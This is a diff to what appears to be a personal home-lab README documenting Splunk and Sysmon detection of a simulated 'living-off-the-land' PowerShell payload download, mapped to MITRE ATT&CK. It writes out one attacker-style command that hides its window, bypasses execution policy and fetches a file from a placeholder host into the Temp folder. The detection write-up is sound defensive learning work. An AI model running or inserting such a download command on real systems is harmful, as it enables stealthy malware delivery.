@@ -71,5 +71,17 @@ In this scenario, I simulated an attacker establishing persistence by creating a
 ![Privilege Escalation 4732](screenshots/07_splunk_event_4732_privilege_escalation.png)
 ![Critical Alert Configuration](screenshots/08_splunk_critical_alert_configured.png)
 
-### Scenario 2: Advanced Execution (Upcoming)
-* Generate malicious traffic using PowerShell and other Living-off-the-Land Binaries (LOLBas).
+### Scenario 2: "Living-off-the-Land" Payload Download (PowerShell)
+In this scenario, I simulated a common malware behavior: using native OS tools to silently download a malicious payload from the internet, bypassing basic antivirus detection.
+
+* **Attack Execution (Red Team):** * Executed a heavily obfuscated PowerShell command: `powershell.exe -nop -w hidden -ep bypass -Command "Invoke-WebRequest -Uri 'https://example.com' -OutFile 'C:\Windows\Temp\payload.ps1'"`
+  * This command hides the window, bypasses execution policies, and drops a file into the `Temp` directory.
+* **Threat Hunting & Log Analysis (Blue Team):**
+  * Utilized Splunk to hunt for suspicious PowerShell executions.
+  * Successfully identified **Sysmon Event ID 1 (Process Creation)** capturing the exact malicious command line arguments (`-w hidden`, `-ep bypass`).
+  * Correlated with **Sysmon Event ID 11 (File Create)**, proving the payload was successfully dropped into `C:\Windows\Temp\payload.ps1`.
+* **Detection Engineering:**
+  * Mapped to MITRE ATT&CK framework: **T1059.001 (Command and Scripting Interpreter: PowerShell)** and **T1105 (Ingress Tool Transfer)**.
+
+#### Visualizing the Threat
+![PowerShell Payload Download](screenshots/09_splunk_sysmon_powershell_download.png)
